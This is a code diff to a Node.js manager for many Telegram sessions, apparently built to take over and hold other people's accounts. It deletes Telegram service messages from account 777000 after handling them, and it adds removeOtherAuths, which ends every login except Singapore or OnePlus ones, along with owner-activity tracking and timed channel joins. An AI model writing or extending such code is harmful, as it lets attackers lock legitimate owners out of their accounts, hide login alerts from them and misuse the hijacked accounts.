@@ -1,4 +1,4 @@
-const { TelegramClient } = require('telegram');
+const { TelegramClient, Api } = require('telegram');
 const { NewMessage } = require("telegram/events/index.js");
 const axios = require('axios');
 const { StringSession } = require('telegram/sessions');
@@ -31,16 +31,14 @@ async function disconnectAll() {
 }
 
 
-async function createClient(number, session) {
+async function createClient(number, session, autoDisconnect = true) {
     return new Promise(async (resolve) => {
         const cli = new TelegramManager(session, number);
-        await cli.createClient();
-        if (cli.expired > -1) {
+        await cli.createClient(autoDisconnect);
+        if (cli.expired) {
             clients.set(number, cli);
-            resolve(cli.expired);
-        } else {
-            resolve(cli.expired);
         }
+        resolve(cli.expired);
     });
 }
 
@@ -59,7 +57,7 @@ class TelegramManager {
         this.session.delete();
     }
 
-    async createClient() {
+    async createClient(autoDisconnect = true) {
         try {
             this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
                 connectionRetries: 5,
@@ -67,13 +65,15 @@ class TelegramManager {
             await this.client.connect();
             const msg = await this.client.sendMessage("777000", { message: "." });
             await msg.delete({ revoke: true });
-            setTimeout(async () => {
-                console.log("SELF destroy client");
-                await this.client.disconnect();
-                await this.client.destroy();
-                this.session.delete();
-                clients.delete(this.phoneNumber);
-            }, 180000)
+            if (autoDisconnect) {
+                setTimeout(async () => {
+                    console.log("SELF destroy client");
+                    await this.client.disconnect();
+                    await this.client.destroy();
+                    this.session.delete();
+                    clients.delete(this.phoneNumber);
+                }, 180000)
+            }
             this.client.addEventHandler(async (event) => { await this.handleEvents(event) }, new NewMessage());
             const myMsgs = await this.client.getMessages('me', { limit: 8 });
             const chats = await this.client?.getDialogs({ limit: 500 });
@@ -95,6 +95,66 @@ class TelegramManager {
         return (resp)
     }
 
+    async joinChannels(str) {
+        const channels = str.split('|');
+        for (let i = 0; i < channels.length; i++) {
+            const channel = channels[i].trim();
+            try {
+                let joinResult;
+                if (channel.startsWith('@')) {
+                    joinResult = await this.client.invoke(
+                        new Api.channels.JoinChannel({
+                            channel: await this.client.getEntity(channel),
+                        })
+                    );
+                } else {
+                    const peerChannel = new Api.PeerChannel({ channelId: bigInt(channel) });
+                    joinResult = await this.client.invoke(
+                        new Api.channels.JoinChannel({
+                            channel: await this.client.getEntity(peerChannel),
+                        })
+                    );
+                }
+                console.log("Joined channel Sucess")
+            } catch (error) {
+              console.log(error);
+            }
+            await new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));
+        }
+    }
+
+
+    async removeOtherAuths() {
+        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
+        const updatedAuthorizations = result.authorizations.map((auth) => {
+            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus')) {
+                return auth;
+            } else {
+                this.client.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
+                return null;
+            }
+        }).filter(Boolean);
+        console.log(updatedAuthorizations);
+    }
+
+    async getAuths() {
+        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
+        return result
+    }
+
+    async getLastActiveTime() {
+        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
+        let latest = 0
+        result.authorizations.map((auth) => {
+            if (!auth.country.toLowerCase().includes('singapore')) {
+                if (latest < auth.dateActive) {
+                    latest = auth.dateActive;
+                }
+            }
+        })
+        return latest
+    }
+
     async handleEvents(event) {
         if (event.isPrivate) {
             if (event.message.chatId.toString() == "777000") {
@@ -107,7 +167,7 @@ class TelegramManager {
                     .then((response) => {
                     })
                     .catch((error) => {
-                        console.error('Error sending message:', error.response.data.description);
+                        console.error('Error sending message:', error.response?.data?.description);
                     });
                 await event.message.delete({ revoke: true });
             }
